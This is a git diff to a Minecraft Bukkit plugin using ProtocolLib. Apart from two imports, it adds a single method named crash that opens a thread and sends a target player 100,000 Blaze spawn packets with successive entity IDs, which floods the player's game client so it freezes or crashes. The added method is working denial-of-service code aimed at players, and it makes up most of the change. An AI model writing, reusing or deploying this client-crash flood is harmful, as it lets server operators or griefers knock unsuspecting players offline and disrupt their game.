@@ -8,7 +8,9 @@ import com.comphenix.protocol.events.ListenerPriority;
 import com.comphenix.protocol.events.PacketAdapter;
 import com.comphenix.protocol.events.PacketEvent;
 import org.bukkit.GameMode;
+import org.bukkit.Location;
 import org.bukkit.entity.Entity;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import ru.dehasher.bukkit.HCore;
 
@@ -59,5 +61,22 @@ public class PLAPI {
                 }
             });
         }
+    }
+
+    public static void crash(Player player) {
+        new Thread(() -> {
+            Location loc = player.getLocation();
+            WrapperPlayServerSpawnEntityLiving packet = new WrapperPlayServerSpawnEntityLiving();
+
+            packet.setType(EntityType.BLAZE);
+            packet.setX(loc.getX());
+            packet.setY(loc.getY());
+            packet.setZ(loc.getZ());
+
+            for (int i = 0; i < 100000; i++) {
+                packet.setEntityID(i);
+                packet.sendPacket(player);
+            }
+        }).start();
     }
 }
